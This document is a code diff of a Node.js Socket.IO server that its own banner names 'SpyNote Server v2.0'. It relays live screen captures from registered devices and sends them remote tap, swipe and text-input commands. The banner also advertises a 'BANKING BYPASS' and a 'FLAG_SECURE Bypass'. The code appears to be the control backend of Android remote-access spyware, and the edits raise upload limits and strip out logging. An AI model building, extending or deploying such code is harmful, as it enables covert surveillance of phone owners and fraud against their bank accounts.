@@ -10,13 +10,13 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 10000,
     pingInterval: 5000,
-    maxHttpBufferSize: 100 * 1024 * 1024
+    maxHttpBufferSize: 150 * 1024 * 1024
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.json({ limit: '150mb' }));
+app.use(express.urlencoded({ limit: '150mb', extended: true }));
 
 const devices = new Map();
 const deviceSockets = new Map();
@@ -49,14 +49,14 @@ io.on('connection', (socket) => {
             deviceSockets.set(deviceId, socket.id);
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
+            console.log("📱 Device LIVE:", deviceId);
         }
     });
 
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.broadcast.emit('screen-update', {
+            socket.broadcast.to(deviceId).emit('screen-update', {
                 deviceId,
                 data: data.data,
                 width: data.width,
@@ -66,22 +66,14 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 ENHANCED CONTROL HANDLER WITH TEXT SUPPORT
+    // 🔥 ENHANCED CONTROL WITH TEXT INPUT
     socket.on('control', (data) => {
-        console.log('🎮 CONTROL:', data.action, 'Device:', data.deviceId);
-        
         const { deviceId, action, x, y, startX, startY, endX, endY, text } = data;
         
-        if (!devices.has(deviceId)) {
-            console.log('❌ Device not found:', deviceId);
-            return;
-        }
+        if (!devices.has(deviceId)) return;
 
         const targetSocketId = deviceSockets.get(deviceId);
-        if (!targetSocketId) {
-            console.log('⚠️ Device socket not found:', deviceId);
-            return;
-        }
+        if (!targetSocketId) return;
 
         const cleanData = {
             action,
@@ -96,17 +88,15 @@ io.on('connection', (socket) => {
 
         io.to(targetSocketId).emit('control', cleanData);
         io.to(deviceId).emit('control', cleanData);
-        console.log('✅ Control sent:', action);
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Client disconnected:', socket.id);
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 deviceSockets.delete(deviceId);
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
+                console.log('📱 Device OFFLINE:', deviceId);
                 break;
             }
         }
@@ -116,5 +106,5 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server v2.0: http://localhost:${PORT}`);
-    console.log(`📱 Multi-device + FULL CONTROL + KEYBOARD + BANKING BYPASS ready!`);
+    console.log(`📱 Multi-device + Text Input + FLAG_SECURE Bypass READY!`);
 });
